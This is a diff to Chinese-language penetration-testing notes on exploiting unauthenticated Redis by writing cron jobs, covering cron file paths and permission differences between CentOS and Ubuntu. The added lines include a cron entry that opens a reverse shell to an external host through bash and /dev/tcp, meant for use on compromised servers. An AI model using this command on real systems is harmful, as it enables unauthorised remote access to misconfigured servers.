@@ -43,7 +43,21 @@ Redis因配置不当可以未授权访问。攻击者无需认证访问到内部
   - 容器化启动redis，没有计划任务文件
     - ![image](https://user-images.githubusercontent.com/84888757/163797414-38a0ef2b-aeab-4df5-8d6b-531c84e1f271.png)
 
-  - 因为默认 redis 写文件后是 644 权限，但是 Ubuntu 要求执行定时任务文件 `/var/spool/cron/crontabs/<username>` 权限必须是 600 才会执行，否则会报错 (root) INSECURE MODE (mode 0600 expected)，而 Centos 的定时任务文件 `/var/spool/cron/<username>` 权限 644 也可以执行
+  - 因为默认 redis 写文件后是 644 权限，但是 Ubuntu 要求执行定时任务文件 `/var/spool/cron/crontabs/<username>` 权限必须是 600 才会执行（即rw），否则会报错 `(root) INSECURE MODE (mode 0600 expected)`，而 Centos 的定时任务文件 `/var/spool/cron/<username>` 权限 644 也可以执行
   - 由于系统的不同，crontrab 定时文件位置也不同
     - Centos 的定时任务文件在 `/var/spool/cron/<username>`
     - Ubuntu 的定时任务文件在 `/var/spool/cron/crontabs/<username>`
+  
+  - 在ubuntu中 `/bin/sh` 这个软链接指向了 `dash`，而我们反弹 shell 使用的 shell 环境应该是 bash
+
+    在centos中`/bin/sh` 这个软链接指向了 `bash`
+    
+    - ![image](https://user-images.githubusercontent.com/84888757/172678636-d1fb9f00-feab-4c1b-a2a1-ae3fcfb9aaf4.png)
+
+    - ![image](https://user-images.githubusercontent.com/84888757/172678982-58ebf240-70f8-4402-ad4e-31d69fd6b18c.png)
+    
+    - 可通过修改软链接的方式成功反弹shell，但实战中未拿到服务器权限无法修改软链接，故可使用如下命令，不用修改链接指向，直接在 sh 下执行 bash -c
+      - `*/1 * * * *  bash -c "bash -i  >&/dev/tcp/123.207.x.x/1234 0>&1"`
+    
+    - [参考链接](https://www.dazhuanlan.com/knight9001/topics/1061140)
+
